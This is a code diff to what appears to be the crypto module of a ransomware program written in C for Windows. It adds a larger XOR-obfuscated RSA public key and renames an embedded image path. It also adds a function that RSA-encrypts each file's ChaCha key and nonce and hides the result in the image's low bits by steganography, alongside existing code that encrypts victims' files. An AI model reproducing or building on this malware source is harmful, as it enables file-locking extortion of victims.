@@ -1,9 +1,7 @@
 #include "Crypto.h"
 HCRYPTPROV hCryptProv;
-BYTE publicKeyBlob[148] = { 0x7f, 0x63, 0x79, 0x65, 0x65, 0xd0, 0x79, 0x61, 0x2b, 0x36, 0x24, 0x45, 0x79, 0x65, 0x79, 0x65, 0x64, 0x74, 0x78, 0x61, 0x48, 0x39, 0x39, 0x21, 0x4, 0x57, 0xbe, 0xad, 0x97, 0x82, 0xcd, 0x6, 0x8e, 0x2e, 0x8f, 0x6d, 0x7e, 0xfd, 0xff, 0x95, 0x85, 0x21, 0x94, 0xee,
-0xcd, 0xb8, 0x6c, 0x32, 0x9, 0x56, 0x3c, 0xc4, 0x66, 0xe9, 0xb6, 0xde, 0xfa, 0xba, 0x6a, 0xed, 0x31, 0xed, 0xcc, 0x39, 0xe2, 0x41, 0x7f, 0x70, 0x6e, 0x69, 0x9b, 0x8d, 0xa3, 0x6a, 0x4e, 0x25, 0x1f, 0xa2, 0xbd, 0x3b, 0xca, 0x52, 0x71, 0xf2, 0x31, 0x9b, 0x5c, 0xf6, 0x94, 0x29, 0xd8, 0x16, 0x97, 0x7c, 0x7f, 0x39, 0x81, 0x5, 0x92, 0xfd, 0x38, 0x26, 0xf6, 0x76, 0xb8, 0x23, 0xfb, 0x18, 0x85, 0x48, 0x2c, 0xf7, 0x3, 0xe5, 0x39, 0x81, 0x56, 0x12, 0xa4, 0x3b, 0x5f, 0xb5, 0xec, 0xc8, 0x5f, 0x60, 0x9a, 0x4e, 0x4, 0x3c, 0xff, 0xc4,
-0xad, 0x16, 0xaa, 0x29, 0x9e, 0xc2, 0x1f, 0xc3, 0x52, 0x2f, 0x83, 0x9a, 0x14, 0xb5, 0x1c, 0xde };
-LPCSTR duckPath;
+BYTE publicKeyBlob[532] = { 127, 99, 121, 101, 101, 208, 121, 97, 43, 54, 36, 69, 121, 113, 121, 101, 100, 116, 120, 97, 176, 82, 225, 42, 32, 40, 90, 144, 61, 192, 82, 130, 10, 12, 36, 168, 166, 101, 210, 150, 35, 20, 27, 143, 20, 47, 70, 242, 28, 235, 217, 89, 164, 84, 191, 230, 237, 147, 73, 179, 71, 219, 97, 222, 128, 231, 20, 234, 74, 16, 243, 248, 109, 38, 28, 122, 190, 18, 15, 66, 46, 237, 138, 205, 40, 52, 70, 175, 75, 4, 216, 150, 127, 152, 117, 60, 105, 10, 3, 145, 210, 57, 115, 25, 170, 106, 119, 86, 227, 162, 66, 176, 169, 155, 129, 241, 144, 252, 10, 21, 194, 119, 26, 115, 223, 111, 110, 201, 70, 40, 156, 98, 23, 210, 108, 52, 200, 78, 137, 133, 210, 18, 137, 25, 106, 213, 103, 204, 134, 135, 63, 250, 75, 123, 53, 231, 38, 220, 196, 96, 158, 172, 28, 251, 182, 9, 10, 204, 81, 42, 210, 27, 191, 194, 83, 157, 212, 100, 205, 6, 110, 21, 214, 169, 98, 107, 168, 198, 231, 170, 99, 84, 48, 73, 237, 225, 19, 250, 112, 32, 233, 209, 151, 234, 113, 164, 235, 152, 87, 78, 219, 155, 87, 245, 119, 111, 238, 116, 92, 186, 115, 99, 189, 69, 251, 71, 45, 47, 18, 39, 96, 27, 226, 127, 71, 8, 1, 236, 143, 7, 5, 41, 160, 43, 109, 95, 213, 252, 244, 215, 206, 120, 243, 168, 108, 36, 27, 61, 108, 120, 4, 149, 152, 194, 127, 79, 6, 106, 57, 17, 153, 179, 213, 243, 81, 235, 202, 129, 136, 28, 234, 192, 246, 76, 211, 49, 143, 56, 20, 169, 1, 110, 207, 128, 230, 34, 116, 163, 29, 81, 155, 11, 250, 214, 58, 255, 148, 123, 7, 197, 210, 164, 179, 150, 35, 74, 155, 169, 158, 187, 137, 101, 143, 200, 105, 48, 162, 223, 18, 98, 236, 243, 216, 164, 15, 28, 96, 162, 113, 178, 46, 175, 145, 211, 150, 45, 197, 75, 223, 110, 14, 209, 58, 142, 67, 172, 127, 2, 201, 219, 5, 45, 198, 43, 228, 226, 75, 215, 109, 66, 195, 142, 141, 47, 32, 205, 232, 148, 15, 27, 180, 115, 157, 163, 176, 137, 251, 222, 194, 33, 30, 254, 114, 67, 147, 155, 49, 90, 171, 21, 205, 97, 200, 255, 17, 93, 201, 248, 157, 107, 164, 64, 33, 109, 231, 46, 231, 109, 252, 239, 62, 180, 235, 148, 79, 202, 75, 6, 191, 36, 53, 88, 143, 93, 196, 198, 234, 214, 237, 166, 112, 33, 132, 181, 66, 12, 17, 123, 128, 72, 126, 192, 38, 238, 193, 251, 103, 120, 60, 70, 171, 46, 80, 128, 185, 47, 104, 163, 42, 18, 16, 125, 174, 246, 192, 254, 199, 13, 48, 106, 200, 9, 197, 168, 38, 108, 69, 181, 195, 145, 87, 52, 55, 71, 100, 174, 188, 152, 4, 64, 130, 134, 85, 55, 225, 233, 181, 42, 0, 221, 141, 16, 183, 94, 1, 223, 70, 246, 118, 148, 140, 109, 255, 119, 71, 202, 11, 53, 127, 0, 179, 221 };
+LPCSTR memePath;
 
 int extractResource() {
 	LPSTR lpTemp;
@@ -26,12 +24,12 @@ int extractResource() {
 		goto CLEANUP;
 	}
 
-	strcat(lpTemp, "duckTempFile.bmp");
-	duckPath = (LPCSTR)calloc(strlen(lpTemp) + 1, 1);
-	if (!duckPath) {
+	strcat(lpTemp, "memeFile.bmp");
+	memePath = (LPCSTR)calloc(strlen(lpTemp) + 1, 1);
+	if (!memePath) {
 		goto CLEANUP;
 	}
-	strcpy((char*)duckPath, lpTemp);
+	strcpy((char*)memePath, lpTemp);
 
 	hFile = GetModuleHandleA(NULL);
 	if (hFile == INVALID_HANDLE_VALUE || !hFile) {
@@ -68,7 +66,7 @@ int extractResource() {
 		goto CLEANUP;
 	}
 
-	duckFile = CreateFileA(duckPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+	duckFile = CreateFileA(memePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (duckFile == INVALID_HANDLE_VALUE || duckFile == 0) {
 		goto CLEANUP;
@@ -103,15 +101,14 @@ int cryptInit() {
 	}
 
 	const char* decryptKey = "yayeet";
-	for (int i = 0; i < 148; i++) {
+	for (int i = 0; i < 532; i++) {
 		publicKeyBlob[i] = publicKeyBlob[i] ^ decryptKey[i % strlen(decryptKey)];
 	}
+	printf("\n");
 
-	if (extractResource() == -1) {
-		return -1;
-	}
-
-
+	//if (extractResource() == -1) {
+	//	return -1;
+	//}
 	return 0;
 }
 
@@ -120,8 +117,8 @@ void cryptCleanUp() {
 	if (hCryptProv != NULL) {
 		CryptReleaseContext(hCryptProv, 0);
 	}
-	if (duckPath) {
-		free((void*)duckPath);
+	if (memePath) {
+		free((void*)memePath);
 	}
 }
 
@@ -311,7 +308,7 @@ int fileEncrypt(LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
 
 	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), ".bmp", lstrlenA(".bmp"));
 
-	if (CopyFileA(duckPath, newFileName, TRUE) == FALSE) {
+	if (CopyFileA(memePath, newFileName, TRUE) == FALSE) {
 		goto CLEANUP;
 	}
 
@@ -340,6 +337,8 @@ int fileEncrypt(LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
 		chachaLargeFileEncrypt(inFile, outFile, key, nonce);
 	}
 
+	encryptKey(outFile, key, nonce);
+
 CLEANUP:
 	if (newFileName) {
 		free(newFileName);
@@ -353,6 +352,72 @@ CLEANUP:
 }
 
 
-//- Hard - coded public key
-//- Server public key(Github) -> have to set up CC, too lazy...
-//- Random number as Chacha key->encrypt file + flip bytes->random number xor with last edit time->encrypted with RSA public->embedded into the image in the front
+int encryptKey(HANDLE encryptedFile, BYTE* key, BYTE* nonce) {
+	SetFilePointer(encryptedFile, 10, 0, FILE_BEGIN);
+	HCRYPTKEY publicKey;
+	BYTE* keyBuffer = NULL;
+	DWORD dataLength = 256 + 8;
+	DWORD fileOffset = 0;
+	BYTE* imageBuffer = NULL;
+	DWORD byteRead = 0;
+	if (CryptImportKey(hCryptProv, publicKeyBlob, 532, 0, 0, &publicKey) == FALSE) {
+		goto CLEANUP;
+	}
+
+	keyBuffer = (BYTE*)calloc(524, 1);
+	if (!keyBuffer) {
+		goto CLEANUP;
+	}
+	memcpy(keyBuffer, key, 256);
+	memcpy(keyBuffer + 256, nonce, 8);
+
+
+	if (CryptEncrypt(publicKey, NULL, TRUE, 0, keyBuffer, &dataLength, 524) == FALSE) {
+		goto CLEANUP;
+	}
+
+	if (ReadFile(encryptedFile, &fileOffset, 4, &byteRead, NULL) == FALSE) {
+		goto CLEANUP;
+	}
+
+	imageBuffer = (BYTE*)calloc(dataLength * 8, 1);
+
+	if (!imageBuffer) {
+		goto CLEANUP;
+	}
+	SetFilePointer(encryptedFile, fileOffset + 1, 0, FILE_BEGIN);
+
+	if (ReadFile(encryptedFile, imageBuffer, dataLength * 8, &byteRead, NULL) == FALSE) {
+		goto CLEANUP;
+	}
+
+	if (byteRead != dataLength * 8) {
+		goto CLEANUP;
+	}
+
+	for (int i = 0; i < dataLength; i++) {
+		BYTE currentByte = keyBuffer[i];
+		for (int j = 0; j < 8; j++) {
+			imageBuffer[i * 8 + j] &= 0xFE;
+			if ((currentByte & 1) == 1) {
+				imageBuffer[i * 8 + j] += 1;
+			}
+			currentByte >>= 1;
+		}
+	}
+
+	SetFilePointer(encryptedFile, fileOffset + 1, 0, FILE_BEGIN);
+	if (WriteFile(encryptedFile, imageBuffer, dataLength * 8, &byteRead, NULL) == FALSE) {
+		goto CLEANUP;
+	}
+
+
+CLEANUP:
+	if (imageBuffer) {
+		free(imageBuffer);
+	}
+	if (keyBuffer) {
+		free(keyBuffer);
+	}
+	return 0;
+}
